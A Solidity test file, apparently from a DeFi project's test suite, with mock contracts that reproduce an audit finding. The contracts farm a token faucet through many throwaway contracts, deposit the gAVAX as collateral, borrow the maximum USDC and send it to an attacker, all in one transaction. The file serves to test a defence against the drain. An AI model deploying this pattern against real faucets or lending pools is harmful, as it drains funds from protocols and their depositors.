// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IFaucetToken {
    function faucet() external;
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

interface ICoopLike {
    function depositCollateral(uint256 amount) external;
    function borrow(uint256 amount) external;
    function positionOf(address user)
        external
        view
        returns (uint256 collateral, uint256 debt, uint256 value, uint256 maxBorrow, uint256 healthBps);
}

/// Test only: a throwaway "player" made by a contract. Its constructor takes the faucet and passes the tokens on.
contract FaucetFarmerMock {
    constructor(IFaucetToken token, address to) {
        token.faucet();
        token.transfer(to, token.balanceOf(address(this)));
    }
}

/// Test only: one farmer of the coop drain found in the audit. It takes the gAVAX faucet, puts it in the granary,
/// borrows as much USDC as it can and sends the loan to the attacker.
contract CoopFarmerMock {
    constructor(IFaucetToken gavax, IFaucetToken usdc, ICoopLike coop, address to) {
        gavax.faucet();
        uint256 amount = gavax.balanceOf(address(this));
        gavax.approve(address(coop), amount);
        coop.depositCollateral(amount);
        (,,, uint256 maxBorrow,) = coop.positionOf(address(this));
        coop.borrow(maxBorrow);
        usdc.transfer(to, usdc.balanceOf(address(this)));
    }
}

/// Test only: creates `farmers` CoopFarmerMocks in one transaction.
contract CoopDrainerMock {
    function drain(IFaucetToken gavax, IFaucetToken usdc, ICoopLike coop, uint256 farmers) external {
        for (uint256 i; i < farmers; i++) new CoopFarmerMock(gavax, usdc, coop, msg.sender);
    }
}
